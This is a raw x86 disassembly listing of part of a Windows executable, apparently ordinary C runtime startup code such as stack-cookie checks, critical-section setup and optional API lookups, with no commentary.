  406a66:	50                   	push   %eax
  406a67:	50                   	push   %eax
  406a68:	ff 75 fc             	push   -0x4(%ebp)
  406a6b:	57                   	push   %edi
  406a6c:	53                   	push   %ebx
  406a6d:	56                   	push   %esi
  406a6e:	50                   	push   %eax
  406a6f:	50                   	push   %eax
  406a70:	ff 15 bc d0 40 00    	call   *0x40d0bc
  406a76:	85 c0                	test   %eax,%eax
  406a78:	74 06                	je     0x406a80
  406a7a:	8b df                	mov    %edi,%ebx
  406a7c:	33 ff                	xor    %edi,%edi
  406a7e:	eb 02                	jmp    0x406a82
  406a80:	33 db                	xor    %ebx,%ebx
  406a82:	57                   	push   %edi
  406a83:	e8 e1 f1 ff ff       	call   0x405c69
  406a88:	59                   	pop    %ecx
  406a89:	eb 02                	jmp    0x406a8d
  406a8b:	8b df                	mov    %edi,%ebx
  406a8d:	85 f6                	test   %esi,%esi
  406a8f:	74 07                	je     0x406a98
  406a91:	56                   	push   %esi
  406a92:	ff 15 fc d0 40 00    	call   *0x40d0fc
  406a98:	5f                   	pop    %edi
  406a99:	5e                   	pop    %esi
  406a9a:	8b c3                	mov    %ebx,%eax
  406a9c:	5b                   	pop    %ebx
  406a9d:	8b e5                	mov    %ebp,%esp
  406a9f:	5d                   	pop    %ebp
  406aa0:	c3                   	ret
  406aa1:	8b ff                	mov    %edi,%edi
  406aa3:	56                   	push   %esi
  406aa4:	57                   	push   %edi
  406aa5:	bf 78 4d 41 00       	mov    $0x414d78,%edi
  406aaa:	33 f6                	xor    %esi,%esi
  406aac:	6a 00                	push   $0x0
  406aae:	68 a0 0f 00 00       	push   $0xfa0
  406ab3:	57                   	push   %edi
  406ab4:	e8 fa 02 00 00       	call   0x406db3
  406ab9:	85 c0                	test   %eax,%eax
  406abb:	74 18                	je     0x406ad5
  406abd:	ff 05 b0 4e 41 00    	incl   0x414eb0
  406ac3:	83 c6 18             	add    $0x18,%esi
  406ac6:	83 c7 18             	add    $0x18,%edi
  406ac9:	81 fe 38 01 00 00    	cmp    $0x138,%esi
  406acf:	72 db                	jb     0x406aac
  406ad1:	b0 01                	mov    $0x1,%al
  406ad3:	eb 0a                	jmp    0x406adf
  406ad5:	6a 00                	push   $0x0
  406ad7:	e8 1d 00 00 00       	call   0x406af9
  406adc:	59                   	pop    %ecx
  406add:	32 c0                	xor    %al,%al
  406adf:	5f                   	pop    %edi
  406ae0:	5e                   	pop    %esi
  406ae1:	c3                   	ret
  406ae2:	8b ff                	mov    %edi,%edi
  406ae4:	55                   	push   %ebp
  406ae5:	8b ec                	mov    %esp,%ebp
  406ae7:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
  406aeb:	05 78 4d 41 00       	add    $0x414d78,%eax
  406af0:	50                   	push   %eax
  406af1:	ff 15 80 d0 40 00    	call   *0x40d080
  406af7:	5d                   	pop    %ebp
  406af8:	c3                   	ret
  406af9:	8b ff                	mov    %edi,%edi
  406afb:	56                   	push   %esi
  406afc:	8b 35 b0 4e 41 00    	mov    0x414eb0,%esi
  406b02:	85 f6                	test   %esi,%esi
  406b04:	74 20                	je     0x406b26
  406b06:	6b c6 18             	imul   $0x18,%esi,%eax
  406b09:	57                   	push   %edi
  406b0a:	8d b8 60 4d 41 00    	lea    0x414d60(%eax),%edi
  406b10:	57                   	push   %edi
  406b11:	ff 15 88 d0 40 00    	call   *0x40d088
  406b17:	ff 0d b0 4e 41 00    	decl   0x414eb0
  406b1d:	83 ef 18             	sub    $0x18,%edi
  406b20:	83 ee 01             	sub    $0x1,%esi
  406b23:	75 eb                	jne    0x406b10
  406b25:	5f                   	pop    %edi
  406b26:	b0 01                	mov    $0x1,%al
  406b28:	5e                   	pop    %esi
  406b29:	c3                   	ret
  406b2a:	8b ff                	mov    %edi,%edi
  406b2c:	55                   	push   %ebp
  406b2d:	8b ec                	mov    %esp,%ebp
  406b2f:	6b 45 08 18          	imul   $0x18,0x8(%ebp),%eax
  406b33:	05 78 4d 41 00       	add    $0x414d78,%eax
  406b38:	50                   	push   %eax
  406b39:	ff 15 84 d0 40 00    	call   *0x40d084
  406b3f:	5d                   	pop    %ebp
  406b40:	c3                   	ret
  406b41:	8b ff                	mov    %edi,%edi
  406b43:	55                   	push   %ebp
  406b44:	8b ec                	mov    %esp,%ebp
  406b46:	8b 45 08             	mov    0x8(%ebp),%eax
  406b49:	53                   	push   %ebx
  406b4a:	56                   	push   %esi
  406b4b:	57                   	push   %edi
  406b4c:	8d 1c 85 08 4f 41 00 	lea    0x414f08(,%eax,4),%ebx
  406b53:	8b 03                	mov    (%ebx),%eax
  406b55:	8b 15 00 40 41 00    	mov    0x414000,%edx
  406b5b:	83 cf ff             	or     $0xffffffff,%edi
  406b5e:	8b ca                	mov    %edx,%ecx
  406b60:	8b f2                	mov    %edx,%esi
  406b62:	83 e1 1f             	and    $0x1f,%ecx
  406b65:	33 f0                	xor    %eax,%esi
  406b67:	d3 ce                	ror    %cl,%esi
  406b69:	3b f7                	cmp    %edi,%esi
  406b6b:	74 69                	je     0x406bd6
  406b6d:	85 f6                	test   %esi,%esi
  406b6f:	74 04                	je     0x406b75
  406b71:	8b c6                	mov    %esi,%eax
  406b73:	eb 63                	jmp    0x406bd8
  406b75:	8b 75 10             	mov    0x10(%ebp),%esi
  406b78:	3b 75 14             	cmp    0x14(%ebp),%esi
  406b7b:	74 1a                	je     0x406b97
  406b7d:	ff 36                	push   (%esi)
  406b7f:	e8 59 00 00 00       	call   0x406bdd
  406b84:	59                   	pop    %ecx
  406b85:	85 c0                	test   %eax,%eax
  406b87:	75 2f                	jne    0x406bb8
  406b89:	83 c6 04             	add    $0x4,%esi
  406b8c:	3b 75 14             	cmp    0x14(%ebp),%esi
  406b8f:	75 ec                	jne    0x406b7d
  406b91:	8b 15 00 40 41 00    	mov    0x414000,%edx
  406b97:	33 c0                	xor    %eax,%eax
  406b99:	85 c0                	test   %eax,%eax
  406b9b:	74 29                	je     0x406bc6
  406b9d:	ff 75 0c             	push   0xc(%ebp)
  406ba0:	50                   	push   %eax
  406ba1:	ff 15 1c d0 40 00    	call   *0x40d01c
  406ba7:	8b f0                	mov    %eax,%esi
  406ba9:	85 f6                	test   %esi,%esi
  406bab:	74 13                	je     0x406bc0
  406bad:	56                   	push   %esi
  406bae:	e8 c5 d6 ff ff       	call   0x404278
  406bb3:	59                   	pop    %ecx
  406bb4:	87 03                	xchg   %eax,(%ebx)
  406bb6:	eb b9                	jmp    0x406b71
  406bb8:	8b 15 00 40 41 00    	mov    0x414000,%edx
  406bbe:	eb d9                	jmp    0x406b99
  406bc0:	8b 15 00 40 41 00    	mov    0x414000,%edx
  406bc6:	8b c2                	mov    %edx,%eax
  406bc8:	6a 20                	push   $0x20
  406bca:	83 e0 1f             	and    $0x1f,%eax
  406bcd:	59                   	pop    %ecx
  406bce:	2b c8                	sub    %eax,%ecx
  406bd0:	d3 cf                	ror    %cl,%edi
  406bd2:	33 fa                	xor    %edx,%edi
  406bd4:	87 3b                	xchg   %edi,(%ebx)
  406bd6:	33 c0                	xor    %eax,%eax
  406bd8:	5f                   	pop    %edi
  406bd9:	5e                   	pop    %esi
  406bda:	5b                   	pop    %ebx
  406bdb:	5d                   	pop    %ebp
  406bdc:	c3                   	ret
  406bdd:	8b ff                	mov    %edi,%edi
  406bdf:	55                   	push   %ebp
  406be0:	8b ec                	mov    %esp,%ebp
  406be2:	8b 45 08             	mov    0x8(%ebp),%eax
  406be5:	57                   	push   %edi
  406be6:	8d 3c 85 b8 4e 41 00 	lea    0x414eb8(,%eax,4),%edi
  406bed:	8b 0f                	mov    (%edi),%ecx
  406bef:	85 c9                	test   %ecx,%ecx
  406bf1:	74 0b                	je     0x406bfe
  406bf3:	8d 41 01             	lea    0x1(%ecx),%eax
  406bf6:	f7 d8                	neg    %eax
  406bf8:	1b c0                	sbb    %eax,%eax
  406bfa:	23 c1                	and    %ecx,%eax
  406bfc:	eb 57                	jmp    0x406c55
  406bfe:	53                   	push   %ebx
  406bff:	8b 1c 85 78 df 40 00 	mov    0x40df78(,%eax,4),%ebx
  406c06:	56                   	push   %esi
  406c07:	68 00 08 00 00       	push   $0x800
  406c0c:	6a 00                	push   $0x0
  406c0e:	53                   	push   %ebx
  406c0f:	ff 15 a4 d0 40 00    	call   *0x40d0a4
  406c15:	8b f0                	mov    %eax,%esi
  406c17:	85 f6                	test   %esi,%esi
  406c19:	75 27                	jne    0x406c42
  406c1b:	ff 15 74 d0 40 00    	call   *0x40d074
  406c21:	83 f8 57             	cmp    $0x57,%eax
  406c24:	75 0d                	jne    0x406c33
  406c26:	56                   	push   %esi
  406c27:	56                   	push   %esi
  406c28:	53                   	push   %ebx
  406c29:	ff 15 a4 d0 40 00    	call   *0x40d0a4
  406c2f:	8b f0                	mov    %eax,%esi
  406c31:	eb 02                	jmp    0x406c35
  406c33:	33 f6                	xor    %esi,%esi
  406c35:	85 f6                	test   %esi,%esi
  406c37:	75 09                	jne    0x406c42
  406c39:	83 c8 ff             	or     $0xffffffff,%eax
  406c3c:	87 07                	xchg   %eax,(%edi)
  406c3e:	33 c0                	xor    %eax,%eax
  406c40:	eb 11                	jmp    0x406c53
  406c42:	8b c6                	mov    %esi,%eax
  406c44:	87 07                	xchg   %eax,(%edi)
  406c46:	85 c0                	test   %eax,%eax
  406c48:	74 07                	je     0x406c51
  406c4a:	56                   	push   %esi
  406c4b:	ff 15 a0 d0 40 00    	call   *0x40d0a0
  406c51:	8b c6                	mov    %esi,%eax
  406c53:	5e                   	pop    %esi
  406c54:	5b                   	pop    %ebx
  406c55:	5f                   	pop    %edi
  406c56:	5d                   	pop    %ebp
  406c57:	c3                   	ret
  406c58:	8b ff                	mov    %edi,%edi
  406c5a:	55                   	push   %ebp
  406c5b:	8b ec                	mov    %esp,%ebp
  406c5d:	51                   	push   %ecx
  406c5e:	a1 00 40 41 00       	mov    0x414000,%eax
  406c63:	33 c5                	xor    %ebp,%eax
  406c65:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406c68:	56                   	push   %esi
  406c69:	68 c8 e4 40 00       	push   $0x40e4c8
  406c6e:	68 c0 e4 40 00       	push   $0x40e4c0
  406c73:	68 c8 e4 40 00       	push   $0x40e4c8
  406c78:	6a 03                	push   $0x3
  406c7a:	e8 c2 fe ff ff       	call   0x406b41
  406c7f:	8b f0                	mov    %eax,%esi
  406c81:	83 c4 10             	add    $0x10,%esp
  406c84:	85 f6                	test   %esi,%esi
  406c86:	74 0f                	je     0x406c97
  406c88:	ff 75 08             	push   0x8(%ebp)
  406c8b:	8b ce                	mov    %esi,%ecx
  406c8d:	ff 15 3c d1 40 00    	call   *0x40d13c
  406c93:	ff d6                	call   *%esi
  406c95:	eb 06                	jmp    0x406c9d
  406c97:	ff 15 90 d0 40 00    	call   *0x40d090
  406c9d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406ca0:	33 cd                	xor    %ebp,%ecx
  406ca2:	5e                   	pop    %esi
  406ca3:	e8 b6 a5 ff ff       	call   0x40125e
  406ca8:	8b e5                	mov    %ebp,%esp
  406caa:	5d                   	pop    %ebp
  406cab:	c2 04 00             	ret    $0x4
  406cae:	8b ff                	mov    %edi,%edi
  406cb0:	55                   	push   %ebp
  406cb1:	8b ec                	mov    %esp,%ebp
  406cb3:	51                   	push   %ecx
  406cb4:	a1 00 40 41 00       	mov    0x414000,%eax
  406cb9:	33 c5                	xor    %ebp,%eax
  406cbb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406cbe:	56                   	push   %esi
  406cbf:	68 dc e4 40 00       	push   $0x40e4dc
  406cc4:	68 d4 e4 40 00       	push   $0x40e4d4
  406cc9:	68 dc e4 40 00       	push   $0x40e4dc
  406cce:	6a 04                	push   $0x4
  406cd0:	e8 6c fe ff ff       	call   0x406b41
  406cd5:	83 c4 10             	add    $0x10,%esp
  406cd8:	8b f0                	mov    %eax,%esi
  406cda:	ff 75 08             	push   0x8(%ebp)
  406cdd:	85 f6                	test   %esi,%esi
  406cdf:	74 0c                	je     0x406ced
  406ce1:	8b ce                	mov    %esi,%ecx
  406ce3:	ff 15 3c d1 40 00    	call   *0x40d13c
  406ce9:	ff d6                	call   *%esi
  406ceb:	eb 06                	jmp    0x406cf3
  406ced:	ff 15 9c d0 40 00    	call   *0x40d09c
  406cf3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406cf6:	33 cd                	xor    %ebp,%ecx
  406cf8:	5e                   	pop    %esi
  406cf9:	e8 60 a5 ff ff       	call   0x40125e
  406cfe:	8b e5                	mov    %ebp,%esp
  406d00:	5d                   	pop    %ebp
  406d01:	c2 04 00             	ret    $0x4
  406d04:	8b ff                	mov    %edi,%edi
  406d06:	55                   	push   %ebp
  406d07:	8b ec                	mov    %esp,%ebp
  406d09:	51                   	push   %ecx
  406d0a:	a1 00 40 41 00       	mov    0x414000,%eax
  406d0f:	33 c5                	xor    %ebp,%eax
  406d11:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406d14:	56                   	push   %esi
  406d15:	68 ec e4 40 00       	push   $0x40e4ec
  406d1a:	68 e4 e4 40 00       	push   $0x40e4e4
  406d1f:	68 ec e4 40 00       	push   $0x40e4ec
  406d24:	6a 05                	push   $0x5
  406d26:	e8 16 fe ff ff       	call   0x406b41
  406d2b:	83 c4 10             	add    $0x10,%esp
  406d2e:	8b f0                	mov    %eax,%esi
  406d30:	ff 75 08             	push   0x8(%ebp)
  406d33:	85 f6                	test   %esi,%esi
  406d35:	74 0c                	je     0x406d43
  406d37:	8b ce                	mov    %esi,%ecx
  406d39:	ff 15 3c d1 40 00    	call   *0x40d13c
  406d3f:	ff d6                	call   *%esi
  406d41:	eb 06                	jmp    0x406d49
  406d43:	ff 15 94 d0 40 00    	call   *0x40d094
  406d49:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406d4c:	33 cd                	xor    %ebp,%ecx
  406d4e:	5e                   	pop    %esi
  406d4f:	e8 0a a5 ff ff       	call   0x40125e
  406d54:	8b e5                	mov    %ebp,%esp
  406d56:	5d                   	pop    %ebp
  406d57:	c2 04 00             	ret    $0x4
  406d5a:	8b ff                	mov    %edi,%edi
  406d5c:	55                   	push   %ebp
  406d5d:	8b ec                	mov    %esp,%ebp
  406d5f:	51                   	push   %ecx
  406d60:	a1 00 40 41 00       	mov    0x414000,%eax
  406d65:	33 c5                	xor    %ebp,%eax
  406d67:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406d6a:	56                   	push   %esi
  406d6b:	68 00 e5 40 00       	push   $0x40e500
  406d70:	68 f8 e4 40 00       	push   $0x40e4f8
  406d75:	68 00 e5 40 00       	push   $0x40e500
  406d7a:	6a 06                	push   $0x6
  406d7c:	e8 c0 fd ff ff       	call   0x406b41
  406d81:	83 c4 10             	add    $0x10,%esp
  406d84:	8b f0                	mov    %eax,%esi
  406d86:	ff 75 0c             	push   0xc(%ebp)
  406d89:	ff 75 08             	push   0x8(%ebp)
  406d8c:	85 f6                	test   %esi,%esi
  406d8e:	74 0c                	je     0x406d9c
  406d90:	8b ce                	mov    %esi,%ecx
  406d92:	ff 15 3c d1 40 00    	call   *0x40d13c
  406d98:	ff d6                	call   *%esi
  406d9a:	eb 06                	jmp    0x406da2
  406d9c:	ff 15 98 d0 40 00    	call   *0x40d098
  406da2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406da5:	33 cd                	xor    %ebp,%ecx
  406da7:	5e                   	pop    %esi
  406da8:	e8 b1 a4 ff ff       	call   0x40125e
  406dad:	8b e5                	mov    %ebp,%esp
  406daf:	5d                   	pop    %ebp
  406db0:	c2 08 00             	ret    $0x8
  406db3:	8b ff                	mov    %edi,%edi
  406db5:	55                   	push   %ebp
  406db6:	8b ec                	mov    %esp,%ebp
  406db8:	51                   	push   %ecx
  406db9:	a1 00 40 41 00       	mov    0x414000,%eax
  406dbe:	33 c5                	xor    %ebp,%eax
  406dc0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406dc3:	56                   	push   %esi
  406dc4:	68 30 e5 40 00       	push   $0x40e530
  406dc9:	68 28 e5 40 00       	push   $0x40e528
  406dce:	68 30 e5 40 00       	push   $0x40e530
  406dd3:	6a 14                	push   $0x14
  406dd5:	e8 67 fd ff ff       	call   0x406b41
  406dda:	8b f0                	mov    %eax,%esi
  406ddc:	83 c4 10             	add    $0x10,%esp
  406ddf:	85 f6                	test   %esi,%esi
  406de1:	74 15                	je     0x406df8
  406de3:	ff 75 10             	push   0x10(%ebp)
  406de6:	8b ce                	mov    %esi,%ecx
  406de8:	ff 75 0c             	push   0xc(%ebp)
  406deb:	ff 75 08             	push   0x8(%ebp)
  406dee:	ff 15 3c d1 40 00    	call   *0x40d13c
  406df4:	ff d6                	call   *%esi
  406df6:	eb 0c                	jmp    0x406e04
  406df8:	ff 75 0c             	push   0xc(%ebp)
  406dfb:	ff 75 08             	push   0x8(%ebp)
  406dfe:	ff 15 8c d0 40 00    	call   *0x40d08c
  406e04:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406e07:	33 cd                	xor    %ebp,%ecx
  406e09:	5e                   	pop    %esi
  406e0a:	e8 4f a4 ff ff       	call   0x40125e
  406e0f:	8b e5                	mov    %ebp,%esp
  406e11:	5d                   	pop    %ebp
  406e12:	c2 0c 00             	ret    $0xc
  406e15:	8b ff                	mov    %edi,%edi
  406e17:	55                   	push   %ebp
  406e18:	8b ec                	mov    %esp,%ebp
  406e1a:	51                   	push   %ecx
  406e1b:	a1 00 40 41 00       	mov    0x414000,%eax
  406e20:	33 c5                	xor    %ebp,%eax
  406e22:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406e25:	56                   	push   %esi
  406e26:	68 54 e5 40 00       	push   $0x40e554
  406e2b:	68 4c e5 40 00       	push   $0x40e54c
  406e30:	68 54 e5 40 00       	push   $0x40e554
  406e35:	6a 16                	push   $0x16
  406e37:	e8 05 fd ff ff       	call   0x406b41
  406e3c:	8b f0                	mov    %eax,%esi
  406e3e:	83 c4 10             	add    $0x10,%esp
  406e41:	85 f6                	test   %esi,%esi
  406e43:	74 27                	je     0x406e6c
  406e45:	ff 75 28             	push   0x28(%ebp)
  406e48:	8b ce                	mov    %esi,%ecx
  406e4a:	ff 75 24             	push   0x24(%ebp)
  406e4d:	ff 75 20             	push   0x20(%ebp)
  406e50:	ff 75 1c             	push   0x1c(%ebp)
  406e53:	ff 75 18             	push   0x18(%ebp)
  406e56:	ff 75 14             	push   0x14(%ebp)
  406e59:	ff 75 10             	push   0x10(%ebp)
  406e5c:	ff 75 0c             	push   0xc(%ebp)
  406e5f:	ff 75 08             	push   0x8(%ebp)
  406e62:	ff 15 3c d1 40 00    	call   *0x40d13c
  406e68:	ff d6                	call   *%esi
  406e6a:	eb 20                	jmp    0x406e8c
  406e6c:	ff 75 1c             	push   0x1c(%ebp)
  406e6f:	ff 75 18             	push   0x18(%ebp)
  406e72:	ff 75 14             	push   0x14(%ebp)
  406e75:	ff 75 10             	push   0x10(%ebp)
  406e78:	ff 75 0c             	push   0xc(%ebp)
  406e7b:	6a 00                	push   $0x0
  406e7d:	ff 75 08             	push   0x8(%ebp)
  406e80:	e8 18 00 00 00       	call   0x406e9d
  406e85:	50                   	push   %eax
  406e86:	ff 15 00 d1 40 00    	call   *0x40d100
  406e8c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406e8f:	33 cd                	xor    %ebp,%ecx
  406e91:	5e                   	pop    %esi
  406e92:	e8 c7 a3 ff ff       	call   0x40125e
  406e97:	8b e5                	mov    %ebp,%esp
  406e99:	5d                   	pop    %ebp
  406e9a:	c2 24 00             	ret    $0x24
  406e9d:	8b ff                	mov    %edi,%edi
  406e9f:	55                   	push   %ebp
  406ea0:	8b ec                	mov    %esp,%ebp
  406ea2:	51                   	push   %ecx
  406ea3:	a1 00 40 41 00       	mov    0x414000,%eax
  406ea8:	33 c5                	xor    %ebp,%eax
  406eaa:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406ead:	56                   	push   %esi
  406eae:	68 6c e5 40 00       	push   $0x40e56c
  406eb3:	68 64 e5 40 00       	push   $0x40e564
  406eb8:	68 6c e5 40 00       	push   $0x40e56c
  406ebd:	6a 18                	push   $0x18
  406ebf:	e8 7d fc ff ff       	call   0x406b41
  406ec4:	8b f0                	mov    %eax,%esi
  406ec6:	83 c4 10             	add    $0x10,%esp
  406ec9:	85 f6                	test   %esi,%esi
  406ecb:	74 12                	je     0x406edf
  406ecd:	ff 75 0c             	push   0xc(%ebp)
  406ed0:	8b ce                	mov    %esi,%ecx
  406ed2:	ff 75 08             	push   0x8(%ebp)
  406ed5:	ff 15 3c d1 40 00    	call   *0x40d13c
  406edb:	ff d6                	call   *%esi
  406edd:	eb 09                	jmp    0x406ee8
  406edf:	ff 75 08             	push   0x8(%ebp)
  406ee2:	e8 00 23 00 00       	call   0x4091e7
  406ee7:	59                   	pop    %ecx
  406ee8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406eeb:	33 cd                	xor    %ebp,%ecx
  406eed:	5e                   	pop    %esi
  406eee:	e8 6b a3 ff ff       	call   0x40125e
  406ef3:	8b e5                	mov    %ebp,%esp
  406ef5:	5d                   	pop    %ebp
  406ef6:	c2 08 00             	ret    $0x8
  406ef9:	a1 00 40 41 00       	mov    0x414000,%eax
  406efe:	57                   	push   %edi
  406eff:	6a 20                	push   $0x20
  406f01:	83 e0 1f             	and    $0x1f,%eax
  406f04:	bf 08 4f 41 00       	mov    $0x414f08,%edi
  406f09:	59                   	pop    %ecx
  406f0a:	2b c8                	sub    %eax,%ecx
  406f0c:	33 c0                	xor    %eax,%eax
  406f0e:	d3 c8                	ror    %cl,%eax
  406f10:	33 05 00 40 41 00    	xor    0x414000,%eax
  406f16:	6a 20                	push   $0x20
  406f18:	59                   	pop    %ecx
  406f19:	f3 ab                	rep stos %eax,%es:(%edi)
  406f1b:	b0 01                	mov    $0x1,%al
  406f1d:	5f                   	pop    %edi
  406f1e:	c3                   	ret
  406f1f:	8b ff                	mov    %edi,%edi
  406f21:	55                   	push   %ebp
  406f22:	8b ec                	mov    %esp,%ebp
  406f24:	51                   	push   %ecx
  406f25:	51                   	push   %ecx
  406f26:	a1 00 40 41 00       	mov    0x414000,%eax
  406f2b:	33 c5                	xor    %ebp,%eax
  406f2d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406f30:	8b 0d 88 4f 41 00    	mov    0x414f88,%ecx
  406f36:	85 c9                	test   %ecx,%ecx
  406f38:	74 0a                	je     0x406f44
  406f3a:	33 c0                	xor    %eax,%eax
  406f3c:	83 f9 01             	cmp    $0x1,%ecx
  406f3f:	0f 94 c0             	sete   %al
  406f42:	eb 54                	jmp    0x406f98
  406f44:	56                   	push   %esi
  406f45:	68 14 e5 40 00       	push   $0x40e514
  406f4a:	68 0c e5 40 00       	push   $0x40e50c
  406f4f:	68 14 e5 40 00       	push   $0x40e514
  406f54:	6a 08                	push   $0x8
  406f56:	e8 e6 fb ff ff       	call   0x406b41
  406f5b:	8b f0                	mov    %eax,%esi
  406f5d:	83 c4 10             	add    $0x10,%esp
  406f60:	85 f6                	test   %esi,%esi
  406f62:	74 27                	je     0x406f8b
  406f64:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  406f68:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406f6b:	6a 00                	push   $0x0
  406f6d:	50                   	push   %eax
  406f6e:	8b ce                	mov    %esi,%ecx
  406f70:	ff 15 3c d1 40 00    	call   *0x40d13c
  406f76:	ff d6                	call   *%esi
  406f78:	83 f8 7a             	cmp    $0x7a,%eax
  406f7b:	75 0e                	jne    0x406f8b
  406f7d:	33 c9                	xor    %ecx,%ecx
  406f7f:	ba 88 4f 41 00       	mov    $0x414f88,%edx
  406f84:	41                   	inc    %ecx
  406f85:	87 0a                	xchg   %ecx,(%edx)
  406f87:	b0 01                	mov    $0x1,%al
  406f89:	eb 0c                	jmp    0x406f97
  406f8b:	6a 02                	push   $0x2
  406f8d:	58                   	pop    %eax
  406f8e:	b9 88 4f 41 00       	mov    $0x414f88,%ecx
  406f93:	87 01                	xchg   %eax,(%ecx)
  406f95:	32 c0                	xor    %al,%al
  406f97:	5e                   	pop    %esi
  406f98:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406f9b:	33 cd                	xor    %ebp,%ecx
  406f9d:	e8 bc a2 ff ff       	call   0x40125e
  406fa2:	8b e5                	mov    %ebp,%esp
  406fa4:	5d                   	pop    %ebp
  406fa5:	c3                   	ret
  406fa6:	8b ff                	mov    %edi,%edi
  406fa8:	55                   	push   %ebp
  406fa9:	8b ec                	mov    %esp,%ebp
  406fab:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  406faf:	75 27                	jne    0x406fd8
  406fb1:	56                   	push   %esi
  406fb2:	be b8 4e 41 00       	mov    $0x414eb8,%esi
  406fb7:	83 3e 00             	cmpl   $0x0,(%esi)
  406fba:	74 10                	je     0x406fcc
  406fbc:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  406fbf:	74 08                	je     0x406fc9
  406fc1:	ff 36                	push   (%esi)
  406fc3:	ff 15 a0 d0 40 00    	call   *0x40d0a0
  406fc9:	83 26 00             	andl   $0x0,(%esi)
  406fcc:	83 c6 04             	add    $0x4,%esi
  406fcf:	81 fe 08 4f 41 00    	cmp    $0x414f08,%esi
  406fd5:	75 e0                	jne    0x406fb7
  406fd7:	5e                   	pop    %esi
  406fd8:	b0 01                	mov    $0x1,%al
  406fda:	5d                   	pop    %ebp
  406fdb:	c3                   	ret
  406fdc:	8b ff                	mov    %edi,%edi
  406fde:	55                   	push   %ebp
  406fdf:	8b ec                	mov    %esp,%ebp
  406fe1:	51                   	push   %ecx
  406fe2:	51                   	push   %ecx
  406fe3:	53                   	push   %ebx
  406fe4:	57                   	push   %edi
  406fe5:	6a 30                	push   $0x30
  406fe7:	6a 40                	push   $0x40
  406fe9:	e8 1e ec ff ff       	call   0x405c0c
  406fee:	8b f8                	mov    %eax,%edi
  406ff0:	33 db                	xor    %ebx,%ebx
  406ff2:	89 7d f8             	mov    %edi,-0x8(%ebp)
  406ff5:	59                   	pop    %ecx
  406ff6:	59                   	pop    %ecx
  406ff7:	85 ff                	test   %edi,%edi
  406ff9:	75 04                	jne    0x406fff
  406ffb:	8b fb                	mov    %ebx,%edi
  406ffd:	eb 48                	jmp    0x407047
  406fff:	8d 87 00 0c 00 00    	lea    0xc00(%edi),%eax
  407005:	3b f8                	cmp    %eax,%edi
  407007:	74 3e                	je     0x407047
  407009:	56                   	push   %esi
  40700a:	8d 77 20             	lea    0x20(%edi),%esi
  40700d:	8b f8                	mov    %eax,%edi
  40700f:	53                   	push   %ebx
  407010:	68 a0 0f 00 00       	push   $0xfa0
  407015:	8d 46 e0             	lea    -0x20(%esi),%eax
  407018:	50                   	push   %eax
  407019:	e8 95 fd ff ff       	call   0x406db3
  40701e:	83 4e f8 ff          	orl    $0xffffffff,-0x8(%esi)
  407022:	89 1e                	mov    %ebx,(%esi)
  407024:	8d 76 30             	lea    0x30(%esi),%esi
  407027:	89 5e d4             	mov    %ebx,-0x2c(%esi)
  40702a:	8d 46 e0             	lea    -0x20(%esi),%eax
  40702d:	c7 46 d8 00 00 0a 0a 	movl   $0xa0a0000,-0x28(%esi)
  407034:	c6 46 dc 0a          	movb   $0xa,-0x24(%esi)
  407038:	80 66 dd f8          	andb   $0xf8,-0x23(%esi)
  40703c:	88 5e de             	mov    %bl,-0x22(%esi)
  40703f:	3b c7                	cmp    %edi,%eax
  407041:	75 cc                	jne    0x40700f
  407043:	8b 7d f8             	mov    -0x8(%ebp),%edi
  407046:	5e                   	pop    %esi
  407047:	53                   	push   %ebx
  407048:	e8 1c ec ff ff       	call   0x405c69
  40704d:	59                   	pop    %ecx
  40704e:	8b c7                	mov    %edi,%eax
  407050:	5f                   	pop    %edi
  407051:	5b                   	pop    %ebx
  407052:	8b e5                	mov    %ebp,%esp
  407054:	5d                   	pop    %ebp
  407055:	c3                   	ret
  407056:	8b ff                	mov    %edi,%edi
  407058:	55                   	push   %ebp
  407059:	8b ec                	mov    %esp,%ebp
  40705b:	56                   	push   %esi
  40705c:	8b 75 08             	mov    0x8(%ebp),%esi
  40705f:	85 f6                	test   %esi,%esi
  407061:	74 25                	je     0x407088
  407063:	53                   	push   %ebx
  407064:	8d 9e 00 0c 00 00    	lea    0xc00(%esi),%ebx
  40706a:	57                   	push   %edi
  40706b:	8b fe                	mov    %esi,%edi
  40706d:	3b f3                	cmp    %ebx,%esi
  40706f:	74 0e                	je     0x40707f
  407071:	57                   	push   %edi
  407072:	ff 15 88 d0 40 00    	call   *0x40d088
  407078:	83 c7 30             	add    $0x30,%edi
  40707b:	3b fb                	cmp    %ebx,%edi
  40707d:	75 f2                	jne    0x407071
  40707f:	56                   	push   %esi
  407080:	e8 e4 eb ff ff       	call   0x405c69
  407085:	59                   	pop    %ecx
  407086:	5f                   	pop    %edi
  407087:	5b                   	pop    %ebx
  407088:	5e                   	pop    %esi
  407089:	5d                   	pop    %ebp
  40708a:	c3                   	ret
  40708b:	6a 14                	push   $0x14
  40708d:	68 00 28 41 00       	push   $0x412800
  407092:	e8 09 ab ff ff       	call   0x401ba0
  407097:	81 7d 08 00 20 00 00 	cmpl   $0x2000,0x8(%ebp)
  40709e:	1b c0                	sbb    %eax,%eax
  4070a0:	f7 d8                	neg    %eax
  4070a2:	75 17                	jne    0x4070bb
  4070a4:	e8 50 eb ff ff       	call   0x405bf9
  4070a9:	6a 09                	push   $0x9
  4070ab:	5e                   	pop    %esi
  4070ac:	89 30                	mov    %esi,(%eax)
  4070ae:	e8 8a ea ff ff       	call   0x405b3d
  4070b3:	8b c6                	mov    %esi,%eax
